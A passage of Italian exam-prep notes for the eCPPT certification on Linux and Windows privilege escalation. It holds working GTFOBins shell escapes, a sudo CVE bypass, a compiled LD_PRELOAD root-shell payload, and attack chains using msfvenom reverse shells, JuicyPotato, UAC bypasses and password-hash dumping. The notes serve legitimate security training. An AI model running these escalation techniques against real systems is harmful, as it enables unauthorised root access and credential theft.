find / -perm -4000 -type f 2>/dev/null
# anche SGID
find / -perm -2000 -type f 2>/dev/null
# SUID+SGID combinati
find / -perm -6000 -type f 2>/dev/null
```

#### Lab — `vim.tiny` SUID

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/passwd, /usr/bin/sudo, ...
# /usr/bin/vim.tiny    ← anomalo!

ls -al /usr/bin/vim.tiny
# -rwsr-xr-x 1 root root ...

# vim.tiny non ha shell escape diretta (manca :!), ma può EDITARE qualsiasi file come root
vim.tiny /etc/sudoers
# aggiungi:
# student ALL=(ALL) NOPASSWD: ALL
# salva forzando: :wq!

sudo /bin/bash
id   # uid=0(root)
```

#### GTFOBins shell escape (memorizza i top)

| Binario | Payload SUID |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` (full) | `vim -c ':!/bin/sh -p'` |
| `nmap` (vecchio) | `nmap --interactive` → `!sh` |
| `less` / `more` | apri un file → `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `perl` | `perl -e 'exec "/bin/sh", "-p";'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `cp` | sovrascrivi `/etc/passwd` o `/etc/shadow` |
| `tee` | `echo 'r00t:...:0:0::/:/bin/bash' \| tee -a /etc/passwd` |

> **`-p` flag obbligatorio**: senza, bash droppa i privilegi effettivi all'invocazione di una nuova shell (resetta euid se uid != euid).

> **Pattern indiretto:** vim non ha shell escape → ma ha write arbitrario → modifichi sudoers → sudo bash. Riutilizzabile con `cp`, `tee`, `dd`, `nano`.

---

### 3.4 Misconfigured SUDO

> Riferimento: [017_ Misconfigured SUDO Privileges](../Privilege%20Escalation/017_%20Misconfigured%20SUDO%20Privileges.md)

`sudo` permette di eseguire comandi come altro utente (di default root), regolato da `/etc/sudoers`. **Misconfig**: un utente low-priv può eseguire un binario "innocuo" via sudo, ma quel binario ha shell escape → root shell.

Comando di enumerazione: **`sudo -l`**. Catalogo escape: **GTFOBins** sezione *Sudo*.

#### Sintassi `/etc/sudoers`

```
user  host=(runas_user:runas_group)  [tag:]  command
```

Esempi:
```
root     ALL=(ALL:ALL) ALL
student  ALL=(ALL) NOPASSWD: /usr/bin/man
%admin   ALL=(ALL) NOPASSWD: ALL
```

- `NOPASSWD:` = no password richiesta.
- `ALL` come comando = jackpot.
- Comando specifico = serve shell escape (GTFOBins).

#### Cosa cercare in `sudo -l`

| Pattern | Severità | Tecnica |
|---|---|---|
| `(ALL) NOPASSWD: ALL` | Game over | `sudo -i` o `sudo /bin/bash` |
| `(ALL) ALL` | High (serve pass user) | `sudo -i` ma chiede pwd student |
| `NOPASSWD: /usr/bin/<binario>` | Variabile | GTFOBins su quel binario |
| **`env_keep+=LD_PRELOAD`** | High | **Shared Library Injection** (vedi 3.5) |
| `env_keep+=PYTHONPATH` | High | Python library hijack |
| Comando con wildcard `*` | High | Argument injection |
| Path NON assoluto (es. `vim`) | High | PATH hijacking |

#### Lab — `sudo man`

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/man

# GTFOBins → man → Sudo
sudo man man
# dentro il pager (less):
!/bin/sh
# # id → uid=0(root)
```

Funziona perché `man` apre in `less`, che ha la feature `!cmd` per eseguire shell command ereditando l'EUID del processo padre (root, grazie a sudo).

#### Casi tipici GTFOBins sudo

```bash
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo less /etc/profile     # poi !sh
sudo nmap --interactive    # poi !sh (vecchio nmap)
sudo perl -e 'exec "/bin/sh";'
sudo python -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo wget --use-askpass=/tmp/evil.sh /
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### CVE storici da ricordare

- **CVE-2019-14287** (sudo < 1.8.28): se sudoers permette `(ALL, !root)` (tutti tranne root), si bypassa con:
  ```bash
  sudo -u#-1 /bin/bash
  # o
  sudo -u#4294967295 /bin/bash
  ```
- **CVE-2021-3156 (Baron Samedit)**: heap overflow in sudo < 1.9.5p2, local privesc anche senza essere in sudoers.
- **CVE-2021-3560 (Polkit/pkexec)**: correlato (non sudo strict).

> **`sudo -l` è SEMPRE il primo comando** su una macchina Linux compromessa.

---

### 3.5 Shared Library Injection (LD_PRELOAD, RPATH, LD_LIBRARY_PATH)

> Riferimento: [018_ Shared Library Injection](../Privilege%20Escalation/018_%20Shared%20Library%20Injection.md)

Una **shared library** Linux = file `.so` (analogo DLL Windows). **Shared Library Injection** = caricare una `.so` malevola in un processo privilegiato per eseguire codice arbitrario coi suoi privilegi. **Equivalente Linux del DLL Hijacking**.

#### Lookup order del dynamic linker

1. `DT_RPATH` (deprecato) nel binario.
2. **`LD_LIBRARY_PATH`** (env var).
3. `DT_RUNPATH` nel binario.
4. `/etc/ld.so.cache` (gestito da `ldconfig`).
5. Default: `/lib`, `/usr/lib`.

**`LD_PRELOAD`** è speciale: forza il caricamento di una `.so` **prima** di qualsiasi altra → simboli definiti hanno precedenza.

#### Sicurezza di `LD_PRELOAD`

Il dynamic linker **ignora `LD_PRELOAD`** se il binario è SUID/SGID (a meno che la `.so` non sia anch'essa SUID in system dir). Quindi `LD_PRELOAD` da solo NON basta su un SUID binary.

**Eccezione**: `sudoers` con `Defaults env_keep += "LD_PRELOAD"` → sudo **propaga** la variabile al binario lanciato come root → attacco funziona.

#### Lab — LD_PRELOAD + sudo

##### Step 1 — Enum
```bash
sudo -l
# Defaults env_keep += "LD_PRELOAD"
# (root) NOPASSWD: /usr/sbin/apache2
```

##### Step 2 — Payload `.so` in C

`shell.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");   // evita ricorsione infinita
    setgid(0);                // GID root
    setuid(0);                // UID root
    system("/bin/sh");        // spawn shell
}
```

- **`_init()`** = constructor del loader, eseguito al `dlopen`/load.
- `unsetenv("LD_PRELOAD")` evita loop.
- `setuid(0)/setgid(0)` portano UID/GID effettivi a root.
- `system("/bin/sh")` lancia la shell.

##### Step 3 — Compile
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

| Flag | Significato |
|---|---|
| `-fPIC` | Position Independent Code (obbligatorio per `.so`) |
| `-shared` | Produce shared object |
| `-nostartfiles` | Niente `crt0`, `_init()` come entry point puro |

##### Step 4 — Trigger
```bash
sudo LD_PRELOAD=/home/student/shell.so apache2
# # id → uid=0(root) gid=0(root)
```

#### Altre tecniche di shared library injection

| Tecnica | Descrizione | Prerequisito |
|---|---|---|
| **LD_PRELOAD** | Forza `.so` prima delle altre | `env_keep+=LD_PRELOAD` in sudoers |
| **LD_LIBRARY_PATH hijack** | Aggiunge dir scrivibile alla search path | `env_keep+=LD_LIBRARY_PATH` + lib mancante/overridabile |
| **RPATH/RUNPATH hijack** | Binario embedda path scrivibile | Binario compilato con RPATH inseguro |
| **`/etc/ld.so.conf.d/` writable** | Add path con lib malevola + `ldconfig` | Write su dir + run di ldconfig |
| **`ptrace()` injection** | Inietta `dlopen` in processo target a runtime | `CAP_SYS_PTRACE` o `ptrace_scope=0` |
| **`.so` mancante in binario SUID** | `ldd binary` mostra "not found" → drop in cwd | SUID binary con dep mancante |

#### Verifica delle dipendenze

```bash
ldd /usr/sbin/apache2
# "not found" = candidate hijack

readelf -d /path/binary | grep -i rpath  # vede RPATH/RUNPATH
```

#### Variante LD_LIBRARY_PATH

```bash
mkdir /tmp/evil
cp shell.so /tmp/evil/libcrypto.so.1.1
sudo LD_LIBRARY_PATH=/tmp/evil /usr/sbin/apache2
```

> **Trigger chiave esame:** vedere `env_keep+=LD_PRELOAD` in `sudo -l` → catena quasi automatica.

---



### Quiz: Linux Privesc - SUID, SUDO, GTFOBins e LD_PRELOAD

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="1"></div>

## 4. Cheat sheet enumeration (da memorizzare)

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Enumeration — Windows & Linux](../10_Cheatsheet.md#enumeration-windows-linux).

---



### Quiz: Enumerazione - comandi e tool da ricordare per l'esame

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="2"></div>

## 5. Token & Potato chain history

> Riferimento: [010_ Access Token Impersonation](../Privilege%20Escalation/010_%20Access%20Token%20Impersonation.md), [011_Juicy Potato](../Privilege%20Escalation/011_Juicy%20Potato.md)

La "Potato family" è una **catena di evoluzione** di exploit che sfruttano `SeImpersonate`/`SeAssignPrimaryToken` (privilegi tipici degli account di servizio) per ottenere SYSTEM. Ogni nuovo Potato nasce quando Microsoft patcha il precedente.

### Cronologia + chi sostituisce chi

| Exploit | Anno | Tecnica base | Versioni Windows | Status |
|---|---|---|---|---|
| **HotPotato** | 2016 | NBNS spoofing + WPAD + HTTP→SMB relay | Win 7/8/Server 2008-2012, no patch MS16-075 | Patchato MS16-075 |
| **RottenPotato** | 2017 | NTLM relay locale via DCOM | Win 7/Server 2008 (originale) | Sostituito da Juicy |
| **JuicyPotato** | 2018 | Variante "weaponizzata" di Rotten con QUALSIASI CLSID + porta arbitraria | Win 7/8/10 ≤ 1803, Server 2008/2012/2016 | Patchato Win 10 1809+ / Server 2019 |
| **RoguePotato** | 2020 | RPC redirect su porta 135 esterna (bypassa la fix di Juicy) | Win 10 1809+, Server 2019 | Funziona ancora in molti casi |
| **PrintSpoofer** | 2020 | Abuso `SpoolerService` named pipe | Win 10/Server 2019/2022 con Spooler attivo | Funziona se Spooler ON |
| **GodPotato** | 2023 | RPC su DCOM senza Spooler | Win 10/11, Server 2019/2022 | Stato dell'arte attuale |
| **LonelyPotato** | (var.) | Variante di Rotten per service account | Win 8/10 | Storico |

### Albero decisionale "quale potato usare?"

```
Hai SeImpersonate o SeAssignPrimaryToken?
├── NO  → non sei nella Potato family, prova altro vettore
└── SI  → quale Windows version?
         ├── Win 7/8/Server 2008-2012-2016        → JuicyPotato
         ├── Win 10 1809+/Server 2019 con Spooler → PrintSpoofer
         ├── Win 10 1809+/Server 2019 sin Spooler → RoguePotato
         └── Win 10/11/Server 2022                 → GodPotato (o PrintSpoofer)
```

### Incognito vs Potato — decisione

| Scenario | Strumento |
|---|---|
| Ho `SeImpersonate` **E** token admin GIÀ in memoria | **Incognito** (`load incognito; impersonate_token`) |
| Ho `SeImpersonate` **MA** nessun token admin in memoria | **Potato family** (crea il token) |

> **Tecnica comune sotto il cofano:** tutti i Potato sfruttano `SeImpersonatePrivilege` per impersonare un token SYSTEM che arriva tramite un canale (DCOM, RPC, named pipe, NTLM relay).

---



### Quiz: Token impersonation - evoluzione Potato chain

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="3"></div>

## 6. Tabelle differenze

### Token impersonation tools — comparison

| Tool | Approccio | Quando token target già presente | Quando crearlo |
|---|---|---|---|
| **Incognito** (meterpreter) | Impersonation di token esistenti | Sì (use case principale) | No |
| **Invoke-TokenManipulation** (Power⁠Sploit) | Equivalente PowerShell di Incognito | Sì | No |
| **RottenPotato** | NTLM relay via DCOM | No, crea il token | Sì (legacy) |
| **JuicyPotato** | DCOM + qualsiasi CLSID | No, crea | Sì (Win ≤ 2016) |
| **RoguePotato** | RPC redirect porta 135 esterna | No, crea | Sì (Win 10 1809+) |
| **PrintSpoofer** | Spooler named pipe | No, crea | Sì (se Spooler ON) |
| **GodPotato** | RPC DCOM moderno | No, crea | Sì (Win 10/11/2022) |

### UAC bypass methods — comparison rapida

| Metodo UACMe | Tecnica | Target binary | Auto-elevate via | Status |
|---|---|---|---|---|
| **23** | DLL hijack | `pkgmgr.exe` | Manifest | Patchato build recenti |
| **33** | DLL hijack | `consent.exe` | Manifest | Variabile |
| **41** | Registry hijack | `eventvwr.exe` | `HKCU\...\mscfile\shell\open\command` | Fixed Win 10 1809 |
| **56** | Registry hijack | `fodhelper.exe` | `HKCU\...\ms-settings\shell\open\command` | Spesso ancora unfixed |
| **62** | Env var hijack | `slui.exe` | env | Variabile |
| **70** | COM hijack | `ComputerDefaults.exe` | COM interface | Recente |

### Risultato del bypass (importante!)

| Tecnica | Risultato | Da SYSTEM? |
|---|---|---|
| UAC Bypass (UACMe) | **High Integrity Administrator** | NO — serve ulteriore step |
| Juicy/Rogue/God Potato | **NT AUTHORITY\SYSTEM** | SI direttamente |
| Service Binary Replacement (su servizio SYSTEM) | **NT AUTHORITY\SYSTEM** | SI |
| Token Impersonation di SYSTEM token | **NT AUTHORITY\SYSTEM** | SI |
| `psexec.py admin@<IP>` | **NT AUTHORITY\SYSTEM** | SI (psexec gira come SYSTEM by design) |
| `runas /user:admin` | **Administrator** (NON SYSTEM) | NO |

### Windows vs Linux — vettori equivalenti

| Concetto | Windows | Linux |
|---|---|---|
| Credenziali in file di config | Unattend.xml, ConsoleHost_history.txt | `.env`, `wp-config.php`, `.bash_history` |
| File di sistema scrivibili | Registry Run keys, Service binary | `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` |
| Binari elevati con misconfig | Service insecure permissions | SUID binaries |
| Esecuzione delegata | UAC, `runas /savecred` | `sudo` |
| Library hijacking | DLL Hijacking | Shared Object Injection (LD_PRELOAD) |
| Discovery automatica | Power⁠Up, PrivescCheck | LinPEAS, LinEnum |
| Catalogo escape | LOLBAS | GTFOBins |
| Privilege check | `whoami /priv` | `id`, `sudo -l` |

---



### Quiz: Differenze chiave Windows vs Linux e tool comparison

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="4"></div>

## 7. Attack chains tipiche d'esame

### Windows — Chain A: Power⁠Up → Unattended → SYSTEM

```
[user student low-priv]
  → . .\Power⁠Up.ps1; Invoke-PrivescAudit
  → Unattended Setup file path identificato
  → cat C:\Windows\Panther\Unattend.xml
  → estrai <AutoLogon> Value Base64
  → base64 -d → admin password
  → psexec.py administrator@<IP>
  → NT AUTHORITY\SYSTEM
```

### Windows — Chain B: WinLogon AutoLogon → SYSTEM

```
[user student low-priv]
  → Invoke-PrivescAudit (Power⁠Up) o Invoke-PrivescCheck
  → CredsWinlogon identificato (severity Medium)
  → reg query "HKLM\..\Winlogon" /v DefaultPassword
  → psexec.py administrator@<IP>
  → SYSTEM
```

### Windows — Chain C: Service Binary Replacement

```
[user student low-priv, FileZilla con ModifiableServiceFiles]
  → msfvenom -p windows/meter⁠preter/reverse_tcp -f exe -o 'FileZilla server.exe'
  → IWR su target → sostituisci binario
  → handler con AutoRunScript post/windows/manage/migrate
  → restart servizio (services.msc o sc start)
  → meterpreter come LocalSystem
  → migrate lsass.exe
  → SYSTEM stabilizzato
```

### Windows — Chain D: Registry AutoRun → Admin

```
[user student, write su HKLM\..\Run]
  → reg add HKLM\..\Run /v hacker /d C:\Users\student\Desktop\tool\program.exe /f
  → upload program.exe (msfvenom payload)
  → shutdown /l (o aspetta logon admin)
  → admin logon → autorun esegue → meterpreter come admin
```

### Windows — Chain E: Service Account → SYSTEM (token path)

```
[meterpreter come NT SERVICE\MSSQL$SQLEXPRESS]
  → getprivs → SeImpersonate, SeAssignPrimaryToken
  → load incognito; list_tokens -u → no admin token in memory
  → upload JuicyPotato.exe + backdoor.exe
  → handler secondario su LPORT 5555
  → JuicyPotato.exe -l 5555 -p backdoor.exe -t * -c {CLSID_2016}
  → seconda meterpreter come NT AUTHORITY\SYSTEM
  → migrate lsass.exe; load kiwi; hash⁠dump
```

### Windows — Chain F: Admin → SYSTEM via UAC + Juicy

```
[meterpreter come 'admin' membro Administrators, filtered token]
  → whoami /priv mostra solo SeChangeNotify ecc.
  → hash⁠dump fails; getsystem fails
  → msfvenom -p ... -o backdoor.exe
  → upload backdoor.exe + Akagi64.exe
  → Akagi64.exe 23 C:\..\backdoor.exe
  → nuova session con TUTTI i privilegi admin (High IL)
  → da admin → SYSTEM tramite service install, psexec -s o token impersonation di un SYSTEM token
```

### Windows — Chain G: DLL Hijacking (Phantom)

```
[user student]
  → Procmon64: target.exe + CreateFile + NAME NOT FOUND
  → trovata dwrite.dll mancante in dir writable
  → msfvenom -f dll -o dwrite.dll
  → copy dwrite.dll nella dir
  → admin lancia target.exe → meterpreter come admin
```

### Linux — Chain H: Credential reuse DB → root

```
[user student, no sudo]
  → cd /var/www/html; grep -r db_user .
  → cat local_config/database.inc.php → root:S3cretP@ss
  → su root → root
```

### Linux — Chain I: /etc/shadow writable → root

```
[user student]
  → find / -not -type l -perm -o+w 2>/dev/null
  → /etc/shadow writable
  → openssl passwd -1 -salt abc password
  → vim /etc/shadow → reset hash root
  → su root (pwd: password) → root
```

### Linux — Chain J: SUID vim.tiny → root via sudoers

```
[user student]
  → find / -perm -u=s -type f 2>/dev/null → /usr/bin/vim.tiny anomalo
  → vim.tiny /etc/sudoers → aggiungi "student ALL=(ALL) NOPASSWD: ALL", :wq!
  → sudo /bin/bash → root
```

### Linux — Chain K: sudo man → root via GTFOBins

```
[user student]
  → sudo -l → (root) NOPASSWD: /usr/bin/man
  → sudo man man → !/bin/sh
  → root
```

### Linux — Chain L: LD_PRELOAD via sudo → root

```
[user student]
  → sudo -l → Defaults env_keep += "LD_PRELOAD"; (root) NOPASSWD: /usr/sbin/apache2
  → scrivi shell.c con _init() + setuid(0) + system("/bin/sh")
  → gcc -fPIC -shared -o shell.so shell.c -nostartfiles
  → sudo LD_PRELOAD=/home/student/shell.so apache2
  → root shell
```

---



### Quiz: Attack chains e checklist esame eCPPT

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="5"></div>

## 8. Punti d'attenzione eCPPT — riepilogo finale

### Mindset

1. **Enumerazione → identificazione → exploitation**: in quest'ordine, sempre.
2. **Distingui subito Windows vs Linux**: i toolkit e i vettori sono completamente diversi.
3. **Pattern multi-step**: la potenza non sta in un singolo trick ma nel **concatenare misconfig** (es. SUID vim → modifica sudoers → sudo bash).
4. **NT AUTHORITY\SYSTEM > Administrator > standard user**. `runas /user:admin` ti dà Administrator, NON SYSTEM. Per SYSTEM serve psexec, service install, token impersonation.
5. **UID 0 = root** indipendentemente dal nome.

### Top tool da memorizzare

- **Windows**: Power⁠Up (`Invoke-PrivescAudit`), PrivescCheck (`Invoke-PrivescCheck`), Metasploit, PowerShell, Procmon, UACMe, JuicyPotato, incognito.
- **Linux**: `find`, `sudo -l`, GTFOBins, openssl passwd, gcc + LD_PRELOAD, LinPEAS.

### Top 5 Windows privesc per esame

1. **Unquoted Service Path / Weak Service Permissions** (service binary replacement → SYSTEM).
2. **DLL Hijacking** (Phantom DLL caso più frequente).
3. **Token Impersonation / Juicy Potato** (service account → SYSTEM).
4. **UAC Bypass (UACMe)** (admin in Medium IL → High IL).
5. **Locally Stored Credentials** (Unattended/AutoLogon/Credential Manager/PS history).

### Top 5 Linux privesc per esame

1. **SUID GTFOBins** (`find / -perm -u=s -type f 2>/dev/null` + GTFOBins).
2. **Sudo GTFOBins** (`sudo -l` + GTFOBins sezione Sudo).
3. **`/etc/shadow` o `/etc/passwd` writable** (`openssl passwd -1` + edit).
4. **LD_PRELOAD via sudo** (`env_keep+=LD_PRELOAD` + sudo binary).
5. **Locally stored credentials** (`grep -rni` + `su root` con password reuse).

### Comandi singoli più importanti

- **Windows**: `whoami /priv`, `. .\Power⁠Up.ps1; Invoke-PrivescAudit`, `cmdkey /list`, `runas /savecred /user:admin cmd`, `Get-Acl <path> | Format-List`, `JuicyPotato.exe -l <p> -p <exe> -t * -c {CLSID}`, `Akagi64.exe <method> <payload>`.
- **Linux**: `sudo -l`, `find / -perm -u=s -type f 2>/dev/null`, `find / -writable -type f 2>/dev/null`, `openssl passwd -1 -salt abc password`, `gcc -fPIC -shared -o evil.so evil.c -nostartfiles`, `sudo LD_PRELOAD=/path/evil.so <binary>`.

### Pattern d'esame che il docente sottolinea

- Vedi un `whoami` che dà `LOCAL SERVICE` o `NETWORK SERVICE` o `IIS APPPOOL\*` o `MSSQL$*` → pensa **Potato**.
- Vedi `whoami /priv` con `SeImpersonatePrivilege` → conferma **Potato/Incognito path**.
- Vedi `whoami /priv` ridotto + sei in `Administrators` → pensa **UAC bypass**.
- Vedi `sudo -l` con `NOPASSWD` su un singolo binary → **GTFOBins su quel binario**.
- Vedi `env_keep+=LD_PRELOAD` → **shared library injection**.
- Vedi un SUID anomalo (non `passwd`/`sudo`/`mount`/`ping`) → **GTFOBins SUID** o catena indiretta (vim/cp/tee → modify /etc/sudoers).
- Vedi `/etc/shadow` o `/etc/passwd` con permessi laschi → **reset hash o nuovo UID 0**.

### Errori comuni da evitare

- **Migrare a `explorer.exe` quando sei SYSTEM** → perdi i privilegi. Migra sempre a `lsass.exe`.
- **Dimenticare `-p`** nella shell SUID → privilegi droppati.
- **Sbagliare CLSID di JuicyPotato** per la versione Windows → `authresult` errore.
- **Non distinguere Akagi32 vs Akagi64** rispetto all'arch del processo target.
- **Confondere `runas /savecred` (no password)** con **`runas /user:admin` (chiede password)**.
- **Dimenticare `2>/dev/null`** nei `find` Linux su tutto il fs → output sommerso da permission denied.

---



### Quiz: Riepilogo finale e punti chiave per l'esame eCPPT

<div class="ecppt-quiz" data-module="04_Privilege_Escalation" data-block="6"></div>

## 9. Mappa video → tecnica

| # | Video | Sistema | Tecnica chiave | Link |
|---|---|---|---|---|
| 01 | Course Introduction | — | Objectives | [01](../Privilege%20Escalation/01_Course%20Introduction.md) |
| 02 | Introduction to Privilege Escalation | — | Definizioni (vertical/horizontal) | [02](../Privilege%20Escalation/02_Introduction%20to%20Privilege%20Escalation.md) |
| 03 | Privilege Escalation with Power⁠Up | Windows | `Invoke-PrivescAudit` | [03](../Privilege%20Escalation/03_Privilege%20Escalation%20with%20Power⁠Up.md) |
| 04 | Privilege Escalation with PrivescCheck | Windows | `Invoke-PrivescCheck` | [04](../Privilege%20Escalation/04_Privilege%20Escalation%20with%20Privesc%20Check.md) |
| 05 | Unattended Installation Files | Windows | `Unattend.xml` Base64 | [05](../Privilege%20Escalation/05_%20Unattended%20Installation%20Files.md) |
| 06 | Windows Credential Manager | Windows | `cmdkey /list` + `runas /savecred` | [06](../Privilege%20Escalation/06_Windows%20Credential%20Manager.md) |
| 07 | PowerShell History | Windows | `ConsoleHost_history.txt` | [07](../Privilege%20Escalation/07_%20PowerShell%20History.md) |
| 08 | Exploiting Insecure Service Permissions | Windows | Service binary replacement | [08](../Privilege%20Escalation/08_Exploiting%20Insecure%20Service%20Permissions.md) |
| 09 | Privilege Escalation via Registry AutoRuns | Windows | Registry Run keys hijack | [09](../Privilege%20Escalation/09_Privilege%20Escalation%20via%20Registry%20AutoRuns.md) |
| 10 | Access Token Impersonation | Windows | `incognito` + `impersonate_token` | [010](../Privilege%20Escalation/010_%20Access%20Token%20Impersonation.md) |
| 11 | Juicy Potato | Windows | DCOM + CLSID → SYSTEM | [011](../Privilege%20Escalation/011_Juicy%20Potato.md) |
| 12 | Bypassing UAC with UACMe | Windows | `Akagi64.exe <method>` | [012](../Privilege%20Escalation/012_Bypassing%20UAC%20with%20UACMe.md) |
| 13 | DLL Hijacking | Windows | Phantom DLL + Procmon | [013](../Privilege%20Escalation/013_DLL%20Hijacking.md) |
| 14 | Locally Stored Credentials | Linux | grep config + password reuse | [014](../Privilege%20Escalation/014_Locally%20Stored%20Credentials.md) |
| 15 | Misconfigured File Permissions | Linux | `/etc/shadow` writable + `openssl passwd` | [015](../Privilege%20Escalation/015_Misconfigured%20File%20Permissions.md) |
| 16 | Exploiting SUID Binaries | Linux | `find -perm -4000` + GTFOBins | [016](../Privilege%20Escalation/016_Exploiting%20SUID%20Binaries.md) |
| 17 | Misconfigured SUDO Privileges | Linux | `sudo -l` + GTFOBins Sudo | [017](../Privilege%20Escalation/017_%20Misconfigured%20SUDO%20Privileges.md) |
| 18 | Shared Library Injection | Linux | `LD_PRELOAD` + `_init()` `.so` | [018](../Privilege%20Escalation/018_%20Shared%20Library%20Injection.md) |
| 19 | Course Conclusion | — | Recap | [019](../Privilege%20Escalation/019_Course%20Conclusion.md) |

---

> **Riferimenti finali:**
> - GTFOBins: https://gtfobins.github.io
> - LOLBAS: https://lolbas-project.github.io
> - PayloadsAllTheThings — PrivEsc: https://github.com/swisskyrepo/PayloadsAllTheThings
> - HackTricks: https://book.hacktricks.xyz
> - UACMe: https://github.com/hfiref0x/UACME
> - Power⁠Sploit: https://github.com/PowerShellMafia/Power⁠Sploit
> - PrivescCheck: https://github.com/itm4n/PrivescCheck
> - Juicy Potato: https://github.com/ohpe/juicy-potato
> - MITRE ATT&CK Privilege Escalation Tactics: https://attack.mitre.org/tactics/TA0004/
